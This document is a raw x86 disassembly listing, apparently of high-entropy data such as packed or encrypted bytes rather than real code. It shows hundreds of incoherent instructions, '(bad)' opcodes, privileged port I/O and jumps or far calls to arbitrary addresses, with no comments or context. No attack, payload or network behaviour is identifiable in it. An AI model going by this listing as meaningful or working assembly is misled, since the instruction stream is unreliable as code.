  417c86:	cmp    bl,BYTE PTR [ebx+edi*4-0x4ec37c89]
  417c8d:	add    al,0x8e
  417c8f:	cmc    
  417c90:	push   eax
  417c91:	lods   eax,DWORD PTR ds:[esi]
  417c92:	out    0x5f,al
  417c94:	pop    eax
  417c95:	jae    0x417cde
  417c97:	mov    al,0x9d
  417c99:	add    eax,0x55980341
  417c9e:	adc    eax,0x633b0d26
  417ca3:	xor    al,bh
  417ca5:	loop   0x417c85
  417ca7:	xor    edi,DWORD PTR [esp+edi*2]
  417caa:	xlat   BYTE PTR ds:[ebx]
  417cab:	cmp    bh,BYTE PTR [edi+0x5f6344a5]
  417cb1:	fbld   TBYTE PTR ds:0x1a872832
  417cb7:	or     DWORD PTR [ebp+0x4751cbfb],esi
  417cbd:	loope  0x417d21
  417cbf:	push   es
  417cc0:	dec    edx
  417cc1:	pusha  
  417cc2:	gs sti 
  417cc4:	gs adc ebp,ebp
  417cc7:	dec    eax
  417cc8:	loope  0x417c5a
  417cca:	bound  edx,QWORD PTR [ebp-0x23]
  417ccd:	not    BYTE PTR [ebx]
  417ccf:	pop    es
  417cd0:	aas    
  417cd1:	test   DWORD PTR [esi],eax
  417cd3:	mov    ah,0xb5
  417cd5:	hlt    
  417cd6:	pop    ebp
  417cd7:	inc    edx
  417cd8:	mov    fs,WORD PTR [eax+0x6e5b4596]
  417cde:	xchg   esp,ecx
  417ce0:	and    DWORD PTR [edi],esp
  417ce2:	adc    al,BYTE PTR cs:[edx]
  417ce5:	sbb    ch,BYTE PTR [eax-0xbee0683]
  417ceb:	push   es
  417cec:	xor    esi,DWORD PTR [ebp-0x21334fdb]
  417cf2:	jle    0x417c7c
  417cf4:	pop    DWORD PTR [edx]
  417cf6:	xchg   BYTE PTR [edi-0x55],ah
  417cf9:	mov    edi,0x9206891e
  417cfe:	fnstenv [esi]
  417d00:	cmp    al,0x95
  417d02:	mov    ch,0xed
  417d04:	push   DWORD PTR [ebx-0x3c5d3c36]
  417d0a:	lods   al,BYTE PTR ds:[esi]
  417d0b:	mov    esi,0xd4ce2589
  417d10:	sub    BYTE PTR ds:0xc6748ba3,0x22
  417d17:	mov    ss,WORD PTR [ebx-0x68c02156]
  417d1d:	cmc    
  417d1e:	sub    eax,0x876c0b96
  417d23:	xchg   esi,esi
  417d25:	dec    esi
  417d26:	(bad)  
  417d27:	repz mov esp,0x7b33f3d3
  417d2d:	mov    esp,DWORD PTR [edx+esi*1-0x56]
  417d31:	sub    ecx,eax
  417d33:	hlt    
  417d34:	outs   dx,DWORD PTR ds:[esi]
  417d35:	lock pop ecx
  417d37:	rcr    DWORD PTR ss:[eax+0x72],1
  417d3b:	mov    ebx,DWORD PTR [esi+0x5f816896]
  417d41:	(bad)  
  417d45:	push   esi
  417d46:	push   ss
  417d47:	cmp    BYTE PTR [eax],0xb9
  417d4a:	int3   
  417d4b:	fadd   st,st(4)
  417d4d:	mov    eax,ds:0x81d979c5
  417d52:	xchg   BYTE PTR [eax+0x41940613],al
  417d58:	(bad)  
  417d59:	ret    0x6093
  417d5c:	shr    DWORD PTR [eax+eax*4],cl
  417d5f:	adc    ebp,ebp
  417d61:	out    dx,eax
  417d62:	ds xchg esi,eax
  417d64:	stos   DWORD PTR es:[edi],eax
  417d65:	cmp    al,0xee
  417d67:	mov    dh,0xae
  417d69:	ret    0x73f3
  417d6c:	fcomp  DWORD PTR [ebp+0x6227497a]
  417d72:	ja     0x417d47
  417d74:	sar    BYTE PTR [edx-0x69],0xbb
  417d78:	mov    al,0xf5
  417d7a:	pop    ecx
  417d7b:	push   esp
  417d7c:	mov    DWORD PTR [eax],esi
  417d7e:	dec    eax
  417d7f:	add    DWORD PTR [ebx+edx*1-0x3660fdb3],ecx
  417d86:	sbb    DWORD PTR [edx],0xc4108169
  417d8c:	lods   eax,DWORD PTR ds:[esi]
  417d8d:	cmp    BYTE PTR ds:0x4848e78e,bl
  417d93:	sub    ch,BYTE PTR [esi-0x756985e1]
  417d99:	call   0x4e6a:0x32d5fe3d
  417da0:	or     ebp,DWORD PTR [ebx+0x12]
  417da3:	gs ret 0x31ff
  417da7:	(bad)  
  417da8:	cmp    al,0xda
  417daa:	rcl    ecx,1
  417dac:	cs add eax,0xe7368027
  417db2:	(bad)  
  417db3:	icebp  
  417db4:	(bad)  
  417db5:	sahf   
  417db6:	out    dx,eax
  417db7:	ja     0x417dbd
  417db9:	inc    ebx
  417dba:	cmp    BYTE PTR [edi-0x3fdada61],al
  417dc0:	dec    ecx
  417dc1:	mov    edx,0x1d3a95dc
  417dc6:	outs   dx,BYTE PTR ds:[esi]
  417dc7:	(bad)  
  417dc8:	mov    bl,0x9d
  417dca:	maxps  xmm4,xmm1
  417dcd:	in     al,0x13
  417dcf:	fdivr  DWORD PTR [ecx+edx*4+0x2c]
  417dd3:	mov    dl,0x97
  417dd5:	jbe    0x417d94
  417dd7:	add    cl,BYTE PTR [ecx+0xa]
  417dda:	inc    ecx
  417ddb:	add    bl,al
  417ddd:	scas   eax,DWORD PTR es:[edi]
  417dde:	cmp    DWORD PTR [ebx+0x3f1994fb],esp
  417de4:	push   ebx
  417de5:	jmp    0x417d96
  417de7:	cmp    eax,0xfa15c202
  417dec:	rcl    DWORD PTR [ecx-0xc],cl
  417def:	call   0x6ab9:0x1ae443a2
  417df6:	add    cl,bh
  417df8:	add    al,0x68
  417dfa:	mov    edx,0xa648345d
  417dff:	mov    ds:0x76b5a9c6,eax
  417e04:	sub    ah,BYTE PTR [ebx+0x3e4f1159]
  417e0a:	in     al,0x8
  417e0c:	lods   eax,DWORD PTR ds:[esi]
  417e0d:	bound  edx,QWORD PTR [ebx-0x74eb0d21]
  417e13:	sbb    BYTE PTR [ecx+0x0],ah
  417e16:	xchg   ecx,eax
  417e17:	push   ebx
  417e18:	mov    bl,0x53
  417e1a:	fsubr  QWORD PTR [esi-0x695a6531]
  417e20:	jae    0x417de3
  417e22:	test   DWORD PTR [edx],esi
  417e24:	lock add dl,BYTE PTR [ebx-0x3c6fbf14]
  417e2b:	bound  eax,QWORD PTR [edx]
  417e2d:	bound  ebx,QWORD PTR [ebp-0x6c]
  417e30:	pop    ss
  417e31:	mov    ebp,0x65f2f11e
  417e36:	mov    WORD PTR [ecx],es
  417e38:	dec    edi
  417e39:	jno    0x417e52
  417e3b:	retf   
  417e3c:	dec    ebx
  417e3d:	adc    eax,0x25db1b22
  417e42:	inc    edi
  417e43:	mov    esp,0xf5468513
  417e48:	inc    ebp
  417e49:	in     al,0xd1
  417e4b:	sbb    DWORD PTR [eax+0x24],ebp
  417e4e:	(bad)
  417e52:	rcr    BYTE PTR [eax+ebx*2],cl
  417e55:	jae    0x417e68
  417e57:	loopne 0x417e3f
  417e59:	pushf  
  417e5a:	mov    edi,0xb2bf751f
  417e5f:	push   0x3832e410
  417e64:	int    0xb6
  417e66:	xor    BYTE PTR [eax],ah
  417e68:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417e69:	sub    al,0xdb
  417e6b:	sub    al,0xb
  417e6d:	out    dx,eax
  417e6e:	ja     0x417e9c
  417e70:	push   ecx
  417e71:	sbb    al,0x94
  417e73:	jl     0x417ec2
  417e75:	push   ebp
  417e76:	push   ebx
  417e77:	and    BYTE PTR [ebx],dh
  417e79:	js     0x417e9f
  417e7b:	into   
  417e7c:	retf   
  417e7d:	retf   0x8ab2
  417e80:	mov    esi,0x3ffa653c
  417e85:	cdq    
  417e86:	jno    0x417e11
  417e88:	jecxz  0x417e8d
  417e8a:	sar    edi,cl
  417e8c:	mov    bl,0x4b
  417e8e:	mov    bl,0x61
  417e90:	aas    
  417e91:	sub    ecx,DWORD PTR [edi]
  417e93:	xchg   ebp,eax
  417e94:	mov    cl,BYTE PTR [edi]
  417e96:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417e97:	ret    0x3645
  417e9a:	fst    DWORD PTR [esi]
  417e9c:	fbld   TBYTE PTR [ecx]
  417e9e:	or     DWORD PTR [eax],esp
  417ea0:	cmp    eax,0xeb36984
  417ea5:	ins    BYTE PTR es:[edi],dx
  417ea6:	popf   
  417ea7:	call   0xf6fb70a6
  417eac:	sbb    al,0xbb
  417eae:	xor    ah,BYTE PTR [edx+0x32491dcb]
  417eb4:	adc    BYTE PTR [eax],bl
  417eb6:	lods   al,BYTE PTR ds:[esi]
  417eb7:	jne    0x417ec1
  417eb9:	(bad)  
  417eba:	cmp    ebx,DWORD PTR [esi]
  417ebc:	xchg   edi,eax
  417ebd:	cmove  esi,DWORD PTR [edi+0x55ce88af]
  417ec4:	mov    ebp,0x7649eb00
  417ec9:	mov    ds:0xcf8dc5d1,al
  417ece:	pusha  
  417ecf:	stos   BYTE PTR es:[edi],al
  417ed0:	mov    al,ds:0x6d360ed3
  417ed5:	fld    TBYTE PTR [ebp+0x7d]
  417ed8:	call   0x14e4:0x326ea2
  417edf:	sbb    edi,DWORD PTR [ebx-0x12]
  417ee2:	dec    ecx
  417ee3:	inc    edi
  417ee4:	aam    0x35
  417ee6:	sbb    ecx,DWORD PTR [ebx-0x38dda775]
  417eec:	nop
  417eed:	mov    WORD PTR [esi],cs
  417eef:	sub    ah,BYTE PTR [ebx]
  417ef1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417ef2:	or     BYTE PTR [eax-0x7c],0xe0
  417ef6:	ins    BYTE PTR es:[edi],dx
  417ef7:	adc    BYTE PTR [esi-0x35348bb8],bl
  417efd:	repz sbb esi,DWORD PTR [ebx+edi*8-0x5]
  417f02:	clc    
  417f03:	leave  
  417f04:	push   cs
  417f05:	push   edx
  417f06:	in     eax,dx
  417f07:	push   es
  417f08:	scas   eax,DWORD PTR es:[edi]
  417f09:	mov    al,0x64
  417f0b:	call   FWORD PTR [ebx]
  417f0d:	mov    ebx,0xd56d7682
  417f12:	mov    ecx,0x42929ea5
  417f17:	jecxz  0x417f70
  417f19:	jl     0x417f0a
  417f1b:	jge    0x417f6c
  417f1d:	xor    al,BYTE PTR [edx]
  417f1f:	and    esi,DWORD PTR [edi-0x2c7319db]
  417f25:	aaa    
  417f26:	ficom  WORD PTR [ebx+ebx*4]
  417f29:	sub    ch,BYTE PTR [esi]
  417f2b:	dec    ecx
  417f2c:	neg    DWORD PTR [ebx]
  417f2e:	scas   eax,DWORD PTR es:[edi]
  417f2f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417f30:	push   es
  417f31:	ss retf 
  417f33:	sub    ebp,DWORD PTR [ebp-0x7ab66203]
  417f39:	mov    cs,WORD PTR [edx]
  417f3b:	jle    0x417f47
  417f3d:	cmp    cl,BYTE PTR [ebp-0x75c9fe3b]
  417f43:	cmc    
  417f44:	dec    esi
  417f45:	mov    DWORD PTR [ecx],ecx
  417f47:	rdtsc  
  417f49:	adc    DWORD PTR [ebx+0x60],edx
  417f4c:	and    eax,0x6649aaa9
  417f51:	les    esp,FWORD PTR [esi+0x637cb11d]
  417f57:	and    DWORD PTR [edx+0xfd16a01],edx
  417f5d:	push   esi
  417f5e:	pop    ebp
  417f5f:	(bad)  
  417f60:	push   esp
  417f61:	js     0x417fad
  417f63:	xchg   edx,eax
  417f64:	mov    dl,0xf2
  417f66:	adc    eax,0xf2b0b6f2
  417f6b:	xchg   ebx,eax
  417f6c:	add    BYTE PTR [eax-0x2e03729b],0x8
  417f73:	xchg   ebx,eax
  417f74:	fwait
  417f75:	mov    DWORD PTR [ebp-0xc],ebx
  417f78:	fidiv  DWORD PTR [edi+ecx*2-0x6e23e7d9]
  417f7f:	pushf  
  417f80:	dec    edi
  417f81:	test   eax,0x9c0f4a0c
  417f86:	sbb    eax,0x58265fdb
  417f8b:	push   esp
  417f8c:	imul   edx,DWORD PTR [ebp-0x28],0xffffffa3
  417f90:	stc    
  417f91:	retf   
  417f92:	inc    ebp
  417f93:	(bad)  
  417f94:	retf   
  417f95:	outs   dx,BYTE PTR ds:[esi]
  417f96:	xchg   esp,eax
  417f97:	mov    dl,0x17
  417f99:	sub    BYTE PTR [esi-0x7c],ch
  417f9c:	arpl   WORD PTR [edx],di
  417f9e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417f9f:	out    dx,eax
  417fa0:	inc    ebp
  417fa1:	fwait
  417fa2:	mov    ch,0x7d
  417fa4:	das    
  417fa5:	pop    esi
  417fa6:	rol    bh,1
  417fa8:	test   al,0x0
  417faa:	jne    0x417f3b
  417fac:	imul   ecx,DWORD PTR [ebx-0x7a],0xc52ee03e
  417fb3:	xchg   edi,eax
  417fb4:	lock sub al,0x40
  417fb7:	call   0x2c80ce57
  417fbc:	push   esp
  417fbd:	jae    0x417fc3
  417fbf:	fs das 
  417fc1:	imul   esp,ecx,0x297ec154
  417fc7:	adc    al,0xe9
  417fc9:	aam    0xaf
  417fcb:	inc    eax
  417fcc:	jl     0x41800b
  417fce:	xor    bl,BYTE PTR [eax-0x75b9516a]
  417fd4:	push   ebx
  417fd5:	sub    DWORD PTR [edx],esp
  417fd7:	arpl   WORD PTR [ebx-0x1677eb6b],ax
  417fdd:	fisttp QWORD PTR [esi]
  417fdf:	gs outs dx,BYTE PTR fs:[esi]
  417fe2:	jne    0x41800f
  417fe4:	ins    BYTE PTR es:[edi],dx
  417fe5:	shl    BYTE PTR [ebp+ebx*1+0x73],1
  417fe9:	popf   
  417fea:	(bad)  
  417fec:	test   BYTE PTR [edi],dh
  417fee:	jns    0x418051
  417ff0:	jge    0x417fad
  417ff2:	mov    ah,0x74
  417ff4:	(bad)  
  417ff6:	das    
  417ff7:	sbb    ebp,DWORD PTR [edi]
  417ff9:	xchg   ebp,eax
  417ffa:	cmp    bl,al
  417ffc:	mov    bl,0xdc
  417ffe:	xchg   ebx,eax
  417fff:	clc    
  418000:	mov    bl,0x8d
  418002:	xchg   edi,eax
  418003:	jp     0x418062
  418005:	lock cdq 
  418007:	pushf  
  418008:	add    BYTE PTR ds:0xdaf3433,ah
  41800e:	xor    DWORD PTR [ebp+0x64],0x7a
  418012:	loop   0x41806d
  418014:	xchg   ecx,eax
  418015:	xchg   esp,eax
  418016:	inc    eax
  418017:	push   ecx
  418018:	inc    ebx
  418019:	ss por mm4,mm3
  41801d:	jp     0x417fbc
  41801f:	add    al,0xc6
  418021:	in     eax,dx
  418022:	and    edx,esi
  418024:	imul   ecx,DWORD PTR [edx-0x2d2c27ee],0x531c0ec6
  41802e:	cmp    DWORD PTR [ebp-0x72],esi
  418031:	sahf   
  418032:	jo     0x418091
  418034:	add    eax,0x3fee035c
  418039:	pop    ecx
  41803a:	sub    ah,BYTE PTR ds:0x94cdfe71
  418040:	mov    bh,0xcd
  418042:	inc    ebp
  418043:	pop    edi
  418044:	adc    ebp,DWORD PTR [eax+0x3230649]
  41804a:	mov    ch,al
  41804c:	lahf   
  41804d:	repz cdq 
  41804f:	jo     0x4180a1
  418051:	sub    BYTE PTR [ebp-0x7782c89a],0x6d
  418058:	or     ch,dl
  41805a:	jmp    0x28804719
  41805f:	and    edx,esp
  418061:	jne    0x41803d
  418063:	push   ebp
  418064:	test   eax,0x50ab0535
  418069:	pop    esi
  41806a:	push   ebp
  41806b:	fisttp QWORD PTR [ebp-0x37]
  41806e:	nop
  41806f:	mov    dh,0xf3
  418071:	hlt    
  418072:	inc    edi
  418073:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418074:	shl    DWORD PTR [ebx+0x75d784ee],cl
  41807a:	repnz cmp al,0x1f
  41807d:	inc    edi
  41807e:	sub    eax,DWORD PTR [edi]
  418080:	and    dh,BYTE PTR [edx+0x683bc8e5]
  418086:	in     al,dx
  418087:	and    DWORD PTR [ebx-0x723f72a3],ecx
  41808d:	pop    esi
  41808e:	xor    BYTE PTR [edi-0x19],0x2b
  418092:	jnp    0x418026
  418094:	mov    BYTE PTR [edi+0x4bc921d4],ah
  41809a:	ins    BYTE PTR es:[edi],dx
  41809b:	and    cl,BYTE PTR [eax+0x6e]
  41809e:	scas   al,BYTE PTR es:[edi]
  41809f:	mov    ch,0x4f
  4180a1:	ins    DWORD PTR es:[edi],dx
  4180a2:	call   0x443d:0xd6dc6d4
  4180a9:	popa   
  4180aa:	clc    
  4180ab:	fwait
  4180ac:	sub    al,0x15
  4180ae:	sbb    eax,0x3392e09f
  4180b3:	dec    ebx
  4180b4:	jnp    0x4180cc
  4180b6:	xchg   edx,eax
  4180b7:	shl    al,1
  4180b9:	mov    cl,0xd8
  4180bb:	outs   dx,BYTE PTR ds:[esi]
  4180bc:	std    
  4180bd:	xor    edi,DWORD PTR [ebx]
  4180bf:	sub    BYTE PTR [ecx-0x64af76a8],cl
  4180c5:	out    0x46,al
  4180c7:	inc    ebx
  4180c8:	push   ss
  4180c9:	leave  
  4180ca:	sub    DWORD PTR [esi+0x591350ba],esp
  4180d0:	push   ebp
  4180d1:	pushf  
  4180d2:	xchg   ecx,eax
  4180d3:	sbb    eax,0xfbb89b25
  4180d8:	mov    BYTE PTR [esp+ecx*1],0x4c
  4180dc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4180dd:	sbb    bh,cl
  4180df:	in     al,dx
  4180e0:	sbb    eax,0x594c798e
  4180e5:	and    DWORD PTR [ebx-0x7f],edx
  4180e8:	mov    al,0x18
  4180ea:	inc    ebp
  4180eb:	mov    WORD PTR [ebx+0x49cf90e9],?
  4180f1:	ss loopne 0x4180d3
  4180f4:	mov    esp,0x4d56ee62
  4180f9:	mov    dl,0xba
  4180fb:	fst    DWORD PTR [ebp+0x71]
  4180fe:	push   ds
  4180ff:	mov    cl,0xec
  418101:	adc    edx,ecx
  418103:	adc    edx,esi
  418105:	jns    0x418120
  418107:	mov    bl,0xea
  418109:	cmp    eax,0x78c22a8a
  41810e:	xor    eax,0xd46ce371
  418113:	popa   
  418114:	inc    ecx
  418115:	jge    0x41817e
  418117:	cmc    
  418118:	mov    ebx,ecx
  41811a:	and    DWORD PTR [eax],edi
  41811c:	xor    BYTE PTR [ebx],al
  41811e:	sub    BYTE PTR [ebx-0x3e],ch
  418121:	arpl   WORD PTR [ebp-0x58],sp
  418124:	adc    ebx,DWORD PTR [edi]
  418126:	shl    esp,0x56
  418129:	adc    ch,BYTE PTR [edi+0x1f604848]
  41812f:	push   es
  418130:	repz repz fsubr DWORD PTR [bp+di+0x7]
  418136:	repz and eax,0xc6a314ab
  41813c:	push   0xf19412da
  418141:	mov    edx,0x55a3fe69
  418146:	pop    esi
  418147:	repz rol DWORD PTR [ebx-0x19],cl
  41814b:	sbb    BYTE PTR [eax],bh
  41814d:	push   edi
  41814e:	and    BYTE PTR [ebx-0x73d235b0],cl
  418154:	inc    ebp
  418155:	or     ch,dh
  418157:	repnz mov ebp,0xfb95ebf3
  41815d:	rcr    DWORD PTR [eax],1
  41815f:	or     eax,0x5fdc98c0
  418164:	rcl    DWORD PTR [ebp-0x15],cl
  418167:	cld    
  418168:	mov    al,ds:0x7b8c69ee
  41816d:	add    eax,0x10092cba
  418172:	in     eax,0xa4
  418174:	popf   
  418175:	and    al,0x63
  418177:	fist   WORD PTR [edi]
  418179:	cld    
  41817a:	pop    edi
  41817b:	push   eax
  41817c:	daa    
  41817d:	inc    esi
  41817e:	in     al,dx
  41817f:	scas   eax,DWORD PTR es:[edi]
  418180:	fistp  WORD PTR [edi-0x68]
  418183:	fs mov al,0x2a
  418186:	nop
  418187:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418188:	fdiv   DWORD PTR [esi]
  41818a:	sbb    eax,0x4a8c1e32
  41818f:	ins    DWORD PTR es:[edi],dx
  418190:	aaa    
  418191:	iret   
  418192:	scas   eax,DWORD PTR es:[edi]
  418193:	or     eax,edi
  418195:	mov    cl,0x7c
  418197:	sbb    BYTE PTR [ecx+0x12e87e24],ch
  41819d:	sub    DWORD PTR [ecx+0x22ff3530],ebx
  4181a3:	mov    ds,WORD PTR [ebp-0x584c7587]
  4181a9:	fwait
  4181aa:	jge    0x418198
  4181ac:	cdq    
  4181ad:	outs   dx,BYTE PTR ds:[esi]
  4181ae:	dec    ecx
  4181af:	or     eax,0x3fbade5f
  4181b4:	gs in  al,0x74
  4181b7:	pop    esi
  4181b8:	rcl    DWORD PTR [esi+0x45fc15],cl
  4181be:	sbb    eax,DWORD PTR [eax+edx*8-0x4e]
  4181c2:	stos   BYTE PTR es:[edi],al
  4181c3:	xor    ebx,DWORD PTR [esi]
  4181c5:	mov    al,0x1c
  4181c7:	and    bh,ah
  4181c9:	cmp    al,0xfe
  4181cb:	xchg   ebp,eax
  4181cc:	nop
  4181cd:	pop    edi
  4181ce:	(bad)  
  4181cf:	fdiv   DWORD PTR [ebx]
  4181d1:	stos   DWORD PTR es:[edi],eax
  4181d2:	and    al,0x3f
  4181d4:	or     esp,DWORD PTR [eax+0xec37d8a]
  4181da:	jge    0x418226
  4181dc:	neg    BYTE PTR [ebp-0x69]
  4181df:	cmc    
  4181e0:	fdivr  DWORD PTR [esp+esi*8+0x57]
  4181e4:	xor    ebx,DWORD PTR [ebx-0x5]
  4181e7:	pop    ebx
  4181e8:	fist   DWORD PTR [esp+0x4e]
  4181ec:	and    al,0x7d
  4181ee:	inc    ebp
  4181ef:	lods   eax,DWORD PTR ds:[esi]
  4181f0:	mov    ds:0x3c66ccd5,al
  4181f5:	xchg   edi,eax
  4181f6:	xchg   edx,eax
  4181f7:	jbe    0x4181ba
  4181f9:	mov    dl,0xd3
  4181fb:	pop    ds
  4181fc:	xchg   ebx,eax
  4181fd:	add    bh,dl
  4181ff:	add    edi,esp
  418201:	test   DWORD PTR [esi],esp
  418203:	and    DWORD PTR [esi+0x60a5215d],edx
  418209:	inc    edi
  41820a:	dec    edi
  41820b:	cmp    eax,0x4c72fa55
  418210:	arpl   WORD PTR [esi],si
  418212:	scas   al,BYTE PTR es:[edi]
  418213:	xor    DWORD PTR [esp+eax*4+0x73],esi
  418217:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418218:	xor    bh,cl
  41821a:	mov    DWORD PTR [esi-0x50],0x4cebd53a
  418221:	pop    es
  418222:	push   0x1214c7f7
  418227:	lea    ebp,[ebp-0x59]
  41822a:	sub    eax,0x9b40d42a
  41822f:	inc    edx
  418230:	push   edi
  418231:	std    
  418232:	mov    ebx,cs
  418234:	lods   eax,DWORD PTR ds:[esi]
  418235:	shl    BYTE PTR [edi],1
  418237:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418238:	out    0x5c,eax
  41823a:	inc    esp
  41823b:	cmc    
  41823c:	xchg   ebp,eax
  41823d:	mov    al,ds:0x216c7f2c
  418242:	sbb    DWORD PTR [ecx+0x12914388],eax
  418248:	dec    ebp
  418249:	scas   eax,DWORD PTR es:[edi]
  41824a:	mov    ebx,0x19bd9d5c
  41824f:	xchg   ecx,eax
  418250:	pop    ebp
  418251:	jne    0x418212
  418253:	aas    
  418254:	adc    eax,0x162e9372
  418259:	sub    DWORD PTR [ecx],esp
  41825b:	paddq  mm3,mm4
  41825e:	jmp    0x4182ca
  418260:	push   ebx
  418261:	cli    
  418262:	data16 js 0x4182c7
  418265:	mov    ds:0x6d124f83,eax
  41826a:	ja     0x41821b
  41826c:	nop
  41826d:	sub    BYTE PTR [ebx+0x4b],ch
  418270:	mov    bl,0x15
  418272:	fwait
  418273:	xchg   ebp,eax
  418274:	sar    cl,cl
  418276:	ret    0xde4e
  418279:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41827a:	pushf  
  41827b:	fwait
  41827c:	stos   DWORD PTR es:[edi],eax
  41827d:	sti    
  41827e:	pop    ebx
  41827f:	push   0xf686a944
  418284:	and    BYTE PTR [ebp+ecx*2-0x53210395],dh
  41828b:	jnp    0x4182d7
  41828d:	xchg   esp,eax
  41828e:	dec    esi
  41828f:	push   edx
  418290:	aad    0x14
  418292:	bound  esi,QWORD PTR [edi]
  418294:	push   ebp
  418295:	(bad)  
  418296:	inc    ecx
  418297:	ja     0x4182be
  418299:	and    eax,0x809c4b3e
  41829e:	jo     0x41826a
  4182a0:	jmp    0x60f86688
  4182a5:	test   DWORD PTR [ebx+esi*1],ebp
  4182a8:	sar    DWORD PTR [edx-0x58],1
  4182ab:	sti    
  4182ac:	ja     0x418306
  4182ae:	adc    DWORD PTR [ebx-0x6b1ab2b6],esi
  4182b4:	sub    eax,0x37346fc3
  4182b9:	xor    BYTE PTR [edx+0x67],0x33
  4182bd:	enter  0xf383,0xfc
  4182c1:	mov    edi,0x2acfe3d2
  4182c6:	inc    BYTE PTR [ebp-0x1]
  4182c9:	test   DWORD PTR [esi+0x378948a7],ebx
  4182cf:	add    DWORD PTR [eax-0x1c],ecx
  4182d2:	xor    al,0xf4
  4182d4:	in     al,dx
  4182d5:	out    dx,eax
  4182d6:	scas   al,BYTE PTR es:[edi]
  4182d7:	fs pop ss
  4182d9:	inc    edx
  4182da:	jmp    0x5d00fcc7
  4182df:	mov    eax,ds:0x70553ed
  4182e4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4182e5:	popf   
  4182e6:	sub    al,0x9d
  4182e8:	jae    0x41826c
  4182ea:	jmp    0xb51:0xfa792a90
  4182f1:	call   DWORD PTR [ebx]
  4182f3:	jmp    0xd6f0:0xff5ae3ad
  4182fa:	in     al,dx
  4182fb:	xchg   ecx,eax
  4182fc:	add    eax,0x560ae02e
  418301:	sub    eax,0x3e2fb8d7
  418306:	xor    eax,0x7d9e6171
  41830b:	adc    al,0x5d
  41830d:	cmp    al,0x7e
  41830f:	push   ss
  418310:	fsub   DWORD PTR [ebp+0x51]
  418313:	jnp    0x41831a
  418315:	sub    dh,BYTE PTR [edi-0x6d2d3048]
  41831b:	pop    edi
  41831c:	inc    edi
  41831d:	jl     0x41838a
  41831f:	les    esi,FWORD PTR [edi]
  418321:	loop   0x4182bd
  418323:	inc    eax
  418324:	imul   esi,DWORD PTR [eax],0xffffffb3
  418327:	jecxz  0x4182ea
  418329:	data16 mov WORD PTR [eax],ss
  41832c:	call   0x420e:0x38fe625d
  418333:	pop    edx
  418334:	imul   esi,ebx,0xffffffdf
  418337:	add    BYTE PTR [esi],dh
  418339:	xor    dh,bh
  41833b:	or     DWORD PTR [edx+0x1586f4b],ecx
  418341:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418342:	xor    al,0x7c
  418344:	lods   eax,DWORD PTR ds:[esi]
  418345:	pop    eax
  418346:	lahf   
  418347:	scas   al,BYTE PTR es:[edi]
  418348:	inc    esi
  418349:	test   BYTE PTR [edx],dh
  41834b:	inc    ebp
  41834c:	stos   BYTE PTR es:[edi],al
  41834d:	or     ebp,ebp
  41834f:	xor    DWORD PTR [ebx],0x45
  418352:	lahf   
  418353:	pop    edi
  418354:	jnp    0x41835e
  418356:	aam    0xdc
  418358:	cmc    
  418359:	fmul   st,st(1)
  41835b:	xor    eax,DWORD PTR [eax+ebx*4]
  41835e:	enterw 0x1e77,0xc5
  418363:	(bad)  
  418364:	aas    
  418365:	inc    esi
  418366:	jmp    0xd9168382
  41836b:	inc    ecx
  41836c:	dec    eax
  41836d:	out    dx,eax
  41836e:	xor    esp,DWORD PTR [ebx+0x90c40f1]
  418374:	adc    ch,bh
  418376:	das    
  418377:	fcomp  QWORD PTR [eax-0x11dc29ad]
  41837d:	inc    eax
  41837e:	dec    ecx
  41837f:	xchg   BYTE PTR [esi+0x7f7db64a],bh
  418385:	or     al,0x27
  418387:	stc    
  418388:	retf   0xcbea
  41838b:	inc    ecx
  41838c:	xor    DWORD PTR [ebx-0x78],edx
  41838f:	pop    eax
  418390:	(bad)  
  418391:	cmp    al,0x2c
  418393:	add    ch,bh
  418395:	jb     0x4183bb
  418397:	push   0xffffffd6
  418399:	mov    cl,0x4e
  41839b:	push   edi
  41839c:	xchg   BYTE PTR [ebx+esi*4+0x2c],bl
  4183a0:	xchg   ebp,eax
  4183a1:	in     eax,0x32
  4183a3:	dec    esi
  4183a4:	popf   
  4183a5:	das    
  4183a6:	out    0xbd,eax
  4183a8:	out    0xe7,al
  4183aa:	sbb    DWORD PTR [ecx-0x1a2123a4],esi
  4183b0:	ins    BYTE PTR es:[edi],dx
  4183b1:	mov    esp,0xd9ca293
  4183b6:	sbb    ebp,DWORD PTR [ebx-0x44]
  4183b9:	call   0xa68148ec
  4183be:	or     DWORD PTR [ebx+0x1e],ebx
  4183c1:	dec    edx
  4183c2:	sub    ecx,esp
  4183c4:	dec    edx
  4183c5:	pusha  
  4183c6:	mov    eax,ds:0x8dcfe4a0
  4183cb:	push   0x45
  4183cd:	sbb    eax,DWORD PTR [ebx+0x4a]
  4183d0:	popf   
  4183d1:	ror    DWORD PTR [ebx+esi*4+0x7b],1
  4183d5:	adc    BYTE PTR [edi-0x16],ah
  4183d8:	data16 mov BYTE PTR [eax-0x1531e95a],0xbe
  4183e0:	adc    ebp,DWORD PTR [eax-0x31]
  4183e3:	enter  0xa2d8,0x46
  4183e7:	adc    eax,DWORD PTR [ecx-0x4a34d95c]
  4183ed:	push   ds
  4183ee:	imul   esi,DWORD PTR [esi-0x33],0xffffffe7
  4183f2:	add    dh,cl
  4183f4:	jmp    0x4183b5
  4183f6:	cld    
  4183f7:	neg    DWORD PTR [ebx]
  4183f9:	mov    ebp,0xee9683a4
  4183fe:	ftst   
  418400:	out    dx,eax
  418401:	adc    eax,0x5424fb7a
  418406:	pop    ebp
  418407:	lock stc 
  418409:	sbb    eax,DWORD PTR [ecx-0x6ccf242c]
  41840f:	mov    ds:0xcc89aba7,eax
  418414:	push   ecx
  418415:	pushf  
  418416:	addr16 nop
  418418:	and    al,0xb2
  41841a:	dec    edx
  41841b:	jp     0x41849b
  41841d:	add    cl,BYTE PTR [ecx]
  41841f:	jne    0x418478
  418421:	(bad)  
  418422:	out    dx,eax
